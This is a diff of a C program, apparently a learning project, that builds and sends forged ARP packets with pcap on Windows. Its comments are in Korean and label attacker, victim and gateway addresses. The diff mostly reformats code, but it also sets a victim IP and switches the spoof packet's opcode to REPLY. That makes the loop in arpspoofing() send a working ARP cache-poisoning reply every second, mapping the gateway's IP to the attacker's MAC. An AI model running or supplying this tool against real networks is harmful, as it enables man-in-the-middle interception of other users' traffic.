@@ -21,7 +21,7 @@ bool find_macaddr(uint8_t _src_ip[], uint8_t _dst_mac[]);
 void print_info(uint8_t _addr[], int _len);
 bool arpspoofing();
 #pragma pack(push, 1)
-struct eth_header{
+struct eth_header {
 
 	uint8_t eth_dst[ETH_LEN];
 	uint8_t eth_src[ETH_LEN];
@@ -54,7 +54,7 @@ typedef struct _adapter_list
 	ULONG		ip_addr;
 	ULONG		gate_addr;
 	struct _adapter_list* next;
-} Adapter_list, *pAdapter_list;
+} Adapter_list, * pAdapter_list;
 
 typedef struct _pcap_info
 {
@@ -64,7 +64,7 @@ typedef struct _pcap_info
 	uint8_t		victim_mac[ETH_LEN];
 	uint8_t		gateway_ip[IP_LEN];
 	uint8_t		gateway_mac[ETH_LEN];
-	pcap_t*		pcap_handle;
+	pcap_t* pcap_handle;
 } pcap_info;
 
 pAdapter_list head_list = NULL, tail_list = NULL, work_list = NULL;
@@ -75,7 +75,7 @@ int main(int agrc, char* garv[])
 	info.victim_ip[0] = 192;
 	info.victim_ip[1] = 168;
 	info.victim_ip[2] = 42;
-	info.victim_ip[3] = 14;
+	info.victim_ip[3] = 4;
 
 	if (!get_adapters())
 	{
@@ -307,13 +307,13 @@ bool find_macaddr(uint8_t _src_ip[], uint8_t _dst_mac[])
 	int length = 0;
 	struct eth_header eth;
 	struct arp_header arp;
-	
 
-	memcpy(eth.eth_src, info.attacker_mac,sizeof(info.attacker_mac));
+
+	memcpy(eth.eth_src, info.attacker_mac, sizeof(info.attacker_mac));
 	/*eth.eth_src[0] = info.attacker_mac[0];
 	eth.eth_src[1] = info.attacker_mac[1];
 	eth.eth_src[2] = info.attacker_mac[2];
-   	eth.eth_src[3] = info.attacker_mac[3];
+	eth.eth_src[3] = info.attacker_mac[3];
 	eth.eth_src[4] = info.attacker_mac[4];
 	eth.eth_src[5] = info.attacker_mac[5];*/
 
@@ -338,7 +338,7 @@ bool find_macaddr(uint8_t _src_ip[], uint8_t _dst_mac[])
 	arp.pt = htons(ETH_TYPE_IP);
 	arp.hd_size = 0x06;
 	arp.pt_size = 0x04;
- 	arp.opcode = htons(OPCODE_REQUEST);
+	arp.opcode = htons(OPCODE_REQUEST);
 
 	memcpy(arp.src_host, info.attacker_mac, sizeof(info.attacker_mac)); //송신 mac -> 공격자 mac
 	/*arp.src_host[0] = info.attacker_mac[0];
@@ -362,7 +362,7 @@ bool find_macaddr(uint8_t _src_ip[], uint8_t _dst_mac[])
 	arp.dst_host[3] = _dst_mac[3];
 	arp.dst_host[4] = _dst_mac[4];
 	arp.dst_host[5] = _dst_mac[5];*/
-	
+
 	memcpy(arp.dst_ip, _src_ip, sizeof(_src_ip)); //수신 ip는 피해자
 	/*arp.dst_ip[0] = _src_ip[0];
 	arp.dst_ip[1] = _src_ip[1];
@@ -371,7 +371,7 @@ bool find_macaddr(uint8_t _src_ip[], uint8_t _dst_mac[])
 
 	memcpy(packet + length, &arp, sizeof(arp));
 	length += sizeof(arp);
-	
+
 	memcpy(packet + length, &padding, sizeof(padding));
 	length += sizeof(padding);
 
@@ -381,10 +381,10 @@ bool find_macaddr(uint8_t _src_ip[], uint8_t _dst_mac[])
 			fprintf(stderr, "\n [!] pcap_sendpacket() Error...\n");
 			return false;
 		}
-		
+
 		pcap_next_ex(info.pcap_handle, &header, &pkt_data);
 
-		struct eth_header* _eth;		
+		struct eth_header* _eth;
 		_eth = (struct eth_header*)(pkt_data);
 		int datapointer = sizeof(*_eth);
 
@@ -394,7 +394,7 @@ bool find_macaddr(uint8_t _src_ip[], uint8_t _dst_mac[])
 
 		if (_eth->eth_type == htons(ETH_TYPE_ARP))
 		{
-			
+
 			if (_arp->opcode == ntohs(OPCODE_REPLY)
 				&& _arp->src_ip[0] == _src_ip[0]
 				&& _arp->src_ip[1] == _src_ip[1]
@@ -412,8 +412,8 @@ bool find_macaddr(uint8_t _src_ip[], uint8_t _dst_mac[])
 				return true;
 			}
 		}
-		
-		
+
+
 	}
 }
 
@@ -440,55 +440,53 @@ void print_info(uint8_t _addr[], int _len)
 
 bool arpspoofing()
 
-{	
+{
 
-		uint8_t packet[2500] = { 0 };
-		int length = 0;
-		struct eth_header eth;
+	uint8_t packet[2500] = { 0 };
+	int length = 0;
+	struct eth_header eth;
 
-		memcpy(eth.eth_dst, info.victim_mac, sizeof(info.victim_mac)); //eth 수신mac은 피해자
-		memcpy(eth.eth_src, info.attacker_mac, sizeof(info.attacker_mac)); //eth 송신mac은 공격자
+	memcpy(eth.eth_dst, info.victim_mac, sizeof(info.victim_mac)); //eth 수신mac은 피해자
+	memcpy(eth.eth_src, info.attacker_mac, sizeof(info.attacker_mac)); //eth 송신mac은 공격자
 
-		eth.eth_type = htons(ETH_TYPE_ARP); //eth 타입
+	eth.eth_type = htons(ETH_TYPE_ARP); //eth 타입
 
-		memcpy(packet, &eth, sizeof(eth));
-		length = sizeof(eth);
+	memcpy(packet, &eth, sizeof(eth));
+	length = sizeof(eth);
 
-		struct arp_header arp;
+	struct arp_header arp;
 
-		arp.hd_type = htons(0x0001);   //arp 정리
-		arp.pt = htons(ETH_TYPE_IP);
-		arp.hd_size = 0x06;
-		arp.pt_size = 0x04;
-		arp.opcode = htons(OPCODE_REQUEST);
+	arp.hd_type = htons(0x0001);   //arp 정리
+	arp.pt = htons(ETH_TYPE_IP);
+	arp.hd_size = 0x06;
+	arp.pt_size = 0x04;
+	arp.opcode = htons(OPCODE_REPLY);
 
-		memcpy(arp.src_host, info.attacker_mac, sizeof(info.attacker_mac)); //arp 센더mac 은 공격자
-		memcpy(arp.src_ip, info.gateway_ip, sizeof(info.gateway_ip));  //arp 센더ip는 게이트		memcpy(arp.dst_ip, info.victim_ip, sizeof(info.victim_ip));   //arp 타겟 ip는 피해자웨이
+	memcpy(arp.src_host, info.attacker_mac, sizeof(info.attacker_mac)); //arp 센더mac 은 공격자
+	memcpy(arp.src_ip, info.gateway_ip, sizeof(info.gateway_ip));  //arp 센더ip는 게이트		
+	memcpy(arp.dst_ip, info.victim_ip, sizeof(info.victim_ip));   //arp 타겟 ip는 피해자웨이
+	memcpy(arp.dst_host, info.victim_mac, sizeof(info.victim_mac));  //arp 타겟 mac은 피해자
 
-		memcpy(arp.dst_host, info.victim_mac, sizeof(info.victim_mac));  //arp 타겟 mac은 피해자
+	memcpy(packet + length, &arp, sizeof(arp));
+	length += sizeof(arp);
 
-		memcpy(packet+length, &arp, sizeof(arp));
-		length += sizeof(arp);
-		
-		
-		/*memcpy(packet, &eth, sizeof(eth));
-		length = sizeof(eth);
 
-		memcpy(packet+sizeof(eth), &arp, sizeof(arp));
-		length += sizeof(arp);*/
-		// TODO make arp reply packet
-		for (; ;)
-		{
-			pcap_sendpacket(info.pcap_handle, packet, length);
-			Sleep(1000);
+	/*memcpy(packet, &eth, sizeof(eth));
+	length = sizeof(eth);
+	memcpy(packet+sizeof(eth), &arp, sizeof(arp));
+	length += sizeof(arp);*/
+	// TODO make arp reply packet
+	for (; ;)
+	{
+		pcap_sendpacket(info.pcap_handle, packet, length);
+		Sleep(1000);
 
-		}
-			/*if (pcap_sendpacket(info.pcap_handle, packet, length) != 0)
-			{
-				fprintf(stderr, "\n [!] pcap_sendpacket() Error...\n");
+	}
+	/*if (pcap_sendpacket(info.pcap_handle, packet, length) != 0)
+	{
+		fprintf(stderr, "\n [!] pcap_sendpacket() Error...\n");
+		return false;
+	}
+	return true;*/
 
-				return false;
-			}
-			return true;*/
-		
 }
